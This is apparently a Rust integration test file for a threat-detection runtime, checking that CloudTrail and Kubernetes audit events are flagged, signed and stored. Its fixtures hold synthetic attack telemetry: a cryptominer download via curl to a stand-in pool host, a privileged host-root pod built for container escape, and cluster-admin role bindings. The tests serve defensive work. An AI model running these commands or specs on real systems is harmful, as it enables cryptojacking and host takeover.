#![allow(clippy::unwrap_used)]

use async_trait::async_trait;
use serde_json::json;
use std::fs;
use std::path::Path;
use std::path::PathBuf;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use swarm_core::config::{
    CloudTrailBridgeConfig, JsonFileSourceConfig, KubernetesAuditBridgeConfig, SwarmConfig,
    TelemetryBridgeConfig, TelemetrySourceConfig,
};
use swarm_core::pheromone::ThreatClass;
use swarm_core::types::{AgentId, ResponseAction};
use swarm_ingest_runtime::control::build_composite_detector;
use swarm_pheromone::substrate::validate_deposit_signature;
use swarm_pheromone::{InMemoryPheromoneSubstrate, PheromoneSubstrate};
use swarm_policy::ApprovalContext;
use swarm_policy::static_gate::StaticApprovalGate;
use swarm_response::adapters::SandboxExecutor;
use swarm_runtime::bridge_runtime::{BridgeRuntimeRegistry, bridge_health_report};
use swarm_runtime::config::load_config;
use swarm_runtime::detection::detect_and_deposit;
use swarm_runtime::investigation::{InvestigationOutcome, InvestigationStrategy};
use swarm_runtime::service::{ConfiguredRuntimeStack, EventExecutionContext};
use swarm_whisker::{CloudTrailEvent, KubernetesAuditEvent, TelemetryEvent, TelemetryPayload};
use tokio::sync::{mpsc, watch};
use tokio::time::timeout;

#[derive(Clone)]
struct NoOpInvestigation;

#[async_trait]
impl InvestigationStrategy for NoOpInvestigation {
    fn id(&self) -> &str {
        "no_op"
    }

    async fn investigate(
        &self,
        _replay: &swarm_spine::ReplayBundle,
    ) -> Result<InvestigationOutcome, String> {
        Ok(InvestigationOutcome {
            summary: "no-op".to_string(),
            evidence_points: Vec::new(),
            correlation_keys: Vec::new(),
            candidate_interpretations: Vec::new(),
            vote_lineage: Vec::new(),
        })
    }
}

fn config() -> Result<SwarmConfig, Box<dyn std::error::Error>> {
    Ok(load_config(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../rulesets/default.yaml"
    ))?)
}

fn config_with_strategy(strategy: &str) -> Result<SwarmConfig, Box<dyn std::error::Error>> {
    let mut cfg = config()?;
    cfg.detection.strategy = strategy.to_string();
    Ok(cfg)
}

fn config_with_cloud_bridges(
    cloudtrail_path: &Path,
    kubernetes_audit_path: &Path,
) -> Result<SwarmConfig, Box<dyn std::error::Error>> {
    let mut cfg = config()?;
    cfg.detection.strategy = "cloudtrail".to_string();
    cfg.detection.strategies = vec!["cloudtrail".to_string(), "kubernetes_audit".to_string()];
    cfg.runtime.telemetry_sources = vec![
        TelemetrySourceConfig {
            name: "cloudtrail-primary".to_string(),
            subject: String::new(),
            bridge: Some(TelemetryBridgeConfig::CloudTrail {
                config: Box::new(CloudTrailBridgeConfig {
                    source: JsonFileSourceConfig {
                        path: cloudtrail_path.display().to_string(),
                    },
                }),
            }),
        },
        TelemetrySourceConfig {
            name: "kubernetes-audit-primary".to_string(),
            subject: String::new(),
            bridge: Some(TelemetryBridgeConfig::KubernetesAudit {
                config: Box::new(KubernetesAuditBridgeConfig {
                    source: JsonFileSourceConfig {
                        path: kubernetes_audit_path.display().to_string(),
                    },
                }),
            }),
        },
    ];
    Ok(cfg)
}

fn temp_fixture_path(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    std::env::temp_dir().join(format!(
        "swarm-runtime-cloud-signal-{label}-{}-{nanos}.jsonl",
        std::process::id()
    ))
}

fn execution_context() -> (AgentId, ApprovalContext, ed25519_dalek::SigningKey) {
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[42u8; 32]);
    (
        AgentId::from_verifying_key(&signing_key.verifying_key()),
        ApprovalContext {
            live_mode: false,
            receipt_chain: vec!["seed-receipt".to_string()],
            correlation_id: None,
            now_ms: 1_700_000_000_500,
        },
        signing_key,
    )
}

fn cloudtrail_assume_role_event(event_id: &str) -> TelemetryEvent {
    TelemetryEvent {
        source: "cloudtrail".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_000,
        host_id: Some("123456789012".to_string()),
        payload: TelemetryPayload::CloudTrail(CloudTrailEvent {
            event_name: "AssumeRole".to_string(),
            event_source: "sts.amazonaws.com".to_string(),
            aws_account_id: Some("123456789012".to_string()),
            principal_arn: Some("arn:aws:iam::123456789012:user/alice".to_string()),
            principal_id: Some("AIDAEXAMPLE".to_string()),
            principal_name: Some("alice".to_string()),
            principal_type: Some("IAMUser".to_string()),
            source_ip_address: Some("198.51.100.44".to_string()),
            aws_region: Some("us-east-1".to_string()),
            user_agent: Some("aws-cli/2.15.0".to_string()),
            mfa_authenticated: Some(true),
            request_parameters: json!({
                "roleArn": "arn:aws:iam::123456789012:role/OrganizationAccountAccessRole"
            }),
            response_elements: json!({}),
            error_code: None,
            error_message: None,
        }),
    }
}

fn kubernetes_role_binding_event(event_id: &str) -> TelemetryEvent {
    TelemetryEvent {
        source: "kubernetes_audit".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_100,
        host_id: Some("cluster-prod".to_string()),
        payload: TelemetryPayload::KubernetesAudit(KubernetesAuditEvent {
            verb: "create".to_string(),
            stage: Some("ResponseComplete".to_string()),
            username: Some("system:serviceaccount:prod:builder".to_string()),
            user_groups: vec![
                "system:serviceaccounts".to_string(),
                "system:authenticated".to_string(),
            ],
            source_ips: vec!["203.0.113.22".to_string()],
            user_agent: Some("kubectl/v1.30.0".to_string()),
            namespace: Some("prod".to_string()),
            resource: "clusterrolebindings".to_string(),
            subresource: None,
            resource_name: Some("dangerous-binding".to_string()),
            api_group: Some("rbac.authorization.k8s.io".to_string()),
            response_code: Some(201),
            annotations: json!({
                "authorization.k8s.io/decision": "allow"
            }),
            request_object: json!({
                "roleRef": { "name": "cluster-admin" },
                "subjects": [{
                    "kind": "ServiceAccount",
                    "name": "builder",
                    "namespace": "prod"
                }]
            }),
            impersonated_username: None,
        }),
    }
}

#[tokio::test]
async fn cloudtrail_critical_path_persists_signed_bundle_with_cloud_evidence()
-> Result<(), Box<dyn std::error::Error>> {
    let cfg = config_with_strategy("cloudtrail")?;
    let detector = build_composite_detector(&cfg.detection)?;
    let stack = ConfiguredRuntimeStack::from_components(
        cfg,
        StaticApprovalGate::default(),
        SandboxExecutor,
        NoOpInvestigation,
    )?;
    let event = cloudtrail_assume_role_event("cloudtrail-evt-1");
    let (agent_id, approval, signing_key) = execution_context();

    let result = stack
        .process_event(
            &detector,
            &event,
            EventExecutionContext {
                agent_id: &agent_id,
                approval: &approval,
                signing_key: &signing_key,
            },
            |_finding| {
                Some(ResponseAction::BlockEgress {
                    target: "198.51.100.44".to_string(),
                })
            },
        )
        .await?
        .ok_or("expected persisted cloudtrail replay bundle")?;

    assert_eq!(result.replay.bundle.findings.len(), 1);
    let finding = &result.replay.bundle.findings[0];
    assert_eq!(finding.strategy_id, "cloudtrail");
    assert_eq!(finding.threat_class, ThreatClass::PrivilegeEscalation);
    assert_eq!(finding.evidence["aws_account_id"], "123456789012");
    assert_eq!(
        finding.evidence["principal_arn"],
        "arn:aws:iam::123456789012:user/alice"
    );
    assert_eq!(finding.evidence["event_name"], "AssumeRole");
    assert_eq!(finding.evidence["mitre_technique_id"], "T1078.004");
    assert_eq!(finding.evidence["attack_techniques"][0]["id"], "T1078.004");

    assert_eq!(result.replay.bundle.deposits.len(), 1);
    let deposit = &result.replay.bundle.deposits[0];
    assert_eq!(deposit.threat_class, ThreatClass::PrivilegeEscalation);
    validate_deposit_signature(deposit)?;
    assert_eq!(result.replay.record.hunt_id, "cloudtrail-evt-1");

    Ok(())
}

#[tokio::test]
async fn kubernetes_audit_critical_path_persists_signed_bundle_with_cloud_evidence()
-> Result<(), Box<dyn std::error::Error>> {
    let cfg = config_with_strategy("kubernetes_audit")?;
    let detector = build_composite_detector(&cfg.detection)?;
    let stack = ConfiguredRuntimeStack::from_components(
        cfg,
        StaticApprovalGate::default(),
        SandboxExecutor,
        NoOpInvestigation,
    )?;
    let event = kubernetes_role_binding_event("kube-audit-evt-1");
    let (agent_id, approval, signing_key) = execution_context();

    let result = stack
        .process_event(
            &detector,
            &event,
            EventExecutionContext {
                agent_id: &agent_id,
                approval: &approval,
                signing_key: &signing_key,
            },
            |_finding| {
                Some(ResponseAction::KillProcess {
                    host_id: "cluster-prod".to_string(),
                    process_name: "kubectl".to_string(),
                })
            },
        )
        .await?
        .ok_or("expected persisted kubernetes replay bundle")?;

    assert_eq!(result.replay.bundle.findings.len(), 1);
    let finding = &result.replay.bundle.findings[0];
    assert_eq!(finding.strategy_id, "kubernetes_audit");
    assert_eq!(finding.threat_class, ThreatClass::PrivilegeEscalation);
    assert_eq!(finding.evidence["resource"], "clusterrolebindings");
    assert_eq!(
        finding.evidence["username"],
        "system:serviceaccount:prod:builder"
    );
    assert_eq!(finding.evidence["mitre_technique_id"], "T1098");
    assert_eq!(finding.evidence["attack_techniques"][0]["id"], "T1098");

    assert_eq!(result.replay.bundle.deposits.len(), 1);
    let deposit = &result.replay.bundle.deposits[0];
    assert_eq!(deposit.threat_class, ThreatClass::PrivilegeEscalation);
    validate_deposit_signature(deposit)?;
    assert_eq!(result.replay.record.hunt_id, "kube-audit-evt-1");

    Ok(())
}

#[tokio::test]
async fn cloud_bridges_feed_shared_detection_pipeline_and_surface_bridge_health()
-> Result<(), Box<dyn std::error::Error>> {
    let cloudtrail_path = temp_fixture_path("cloudtrail");
    let kubernetes_path = temp_fixture_path("kubernetes-audit");

    fs::write(
        &cloudtrail_path,
        serde_json::to_string(&json!({
            "eventID": "evt-cloudtrail-bridge",
            "eventName": "RunInstances",
            "eventSource": "ec2.amazonaws.com",
            "eventTime": "2026-04-13T12:00:00Z",
            "recipientAccountId": "123456789012",
            "sourceIPAddress": "198.51.100.99",
            "userAgent": "aws-cli/2.15.0",
            "userIdentity": {
                "type": "IAMUser",
                "userName": "alice",
                "arn": "arn:aws:iam::123456789012:user/alice",
                "principalId": "AIDAEXAMPLE"
            },
            "requestParameters": {
                "instanceType": "c5.4xlarge",
                "imageId": "ami-evilminer",
                "userData": "curl https://pool.example/xmrig"
            },
            "responseElements": {
                "instancesSet": {
                    "items": [{
                        "instanceId": "i-1234567890"
                    }]
                }
            }
        }))?,
    )?;
    fs::write(
        &kubernetes_path,
        serde_json::to_string(&json!({
            "auditID": "evt-kubernetes-bridge",
            "stageTimestamp": "2026-04-13T12:00:01Z",
            "verb": "create",
            "stage": "ResponseComplete",
            "user": {
                "username": "system:serviceaccount:prod:builder",
                "groups": ["system:serviceaccounts", "system:authenticated"]
            },
            "sourceIPs": ["203.0.113.22"],
            "userAgent": "kubectl/v1.30.0",
            "objectRef": {
                "resource": "pods",
                "namespace": "prod",
                "name": "escape-attempt",
                "apiGroup": ""
            },
            "responseStatus": {
                "code": 201
            },
            "annotations": {
                "authorization.k8s.io/decision": "allow"
            },
            "requestObject": {
                "spec": {
                    "hostPID": true,
                    "volumes": [{
                        "name": "host-root",
                        "hostPath": { "path": "/" }
                    }],
                    "containers": [{
                        "name": "escape",
                        "securityContext": {
                            "privileged": true
                        }
                    }]
                }
            }
        }))?,
    )?;

    let config = config_with_cloud_bridges(&cloudtrail_path, &kubernetes_path)?;
    let detector = build_composite_detector(&config.detection)?;
    let substrate = InMemoryPheromoneSubstrate::new(config.pheromone.clone());
    let registry = BridgeRuntimeRegistry::from_config(&config)?;
    let bridge_health = registry.shared_health();
    let (telemetry_tx, mut telemetry_rx) = mpsc::channel(8);
    let (shutdown_tx, shutdown_rx) = watch::channel(false);
    let handles = registry.spawn(telemetry_tx, shutdown_rx, None);
    let (agent_id, _approval, signing_key) = execution_context();

    let mut cloudtrail_outcome = None;
    let mut kubernetes_outcome = None;
    for _ in 0..2 {
        let event = timeout(Duration::from_secs(2), telemetry_rx.recv())
            .await?
            .ok_or("expected bridged telemetry event")?;
        let outcome = detect_and_deposit(
            &detector,
            &substrate,
            &event,
            &agent_id,
            &config.pheromone,
            &signing_key,
        )
        .await?;
        match event.source.as_str() {
            "cloudtrail" => cloudtrail_outcome = Some(outcome),
            "kubernetes_audit" => kubernetes_outcome = Some(outcome),
            other => return Err(format!("unexpected bridged source `{other}`").into()),
        }
    }

    shutdown_tx.send(true).ok();
    for handle in handles {
        handle.await?;
    }

    let health = bridge_health_report(&bridge_health);
    assert_eq!(health.configured, 2);
    assert_eq!(health.ok, 2);
    assert!(
        health
            .entries
            .iter()
            .any(|entry| entry.source_id == "cloudtrail")
    );
    assert!(
        health
            .entries
            .iter()
            .any(|entry| entry.source_id == "kubernetes_audit")
    );

    let cloudtrail_outcome = cloudtrail_outcome.ok_or("missing cloudtrail detection outcome")?;
    assert_eq!(cloudtrail_outcome.findings.len(), 1);
    assert_eq!(cloudtrail_outcome.findings[0].strategy_id, "cloudtrail");
    assert_eq!(
        cloudtrail_outcome.findings[0].threat_class,
        ThreatClass::Impact
    );
    assert_eq!(
        cloudtrail_outcome.findings[0].evidence["event_name"],
        "RunInstances"
    );
    validate_deposit_signature(&cloudtrail_outcome.deposits[0])?;

    let kubernetes_outcome =
        kubernetes_outcome.ok_or("missing kubernetes audit detection outcome")?;
    assert_eq!(kubernetes_outcome.findings.len(), 1);
    assert_eq!(
        kubernetes_outcome.findings[0].strategy_id,
        "kubernetes_audit"
    );
    assert_eq!(
        kubernetes_outcome.findings[0].threat_class,
        ThreatClass::PrivilegeEscalation
    );
    assert_eq!(kubernetes_outcome.findings[0].evidence["resource"], "pods");
    validate_deposit_signature(&kubernetes_outcome.deposits[0])?;

    let persisted = substrate.recent_deposits(10).await?;
    assert_eq!(persisted.len(), 2);
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.threat_class == ThreatClass::Impact)
    );
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.threat_class == ThreatClass::PrivilegeEscalation)
    );

    let _ = fs::remove_file(cloudtrail_path);
    let _ = fs::remove_file(kubernetes_path);

    Ok(())
}
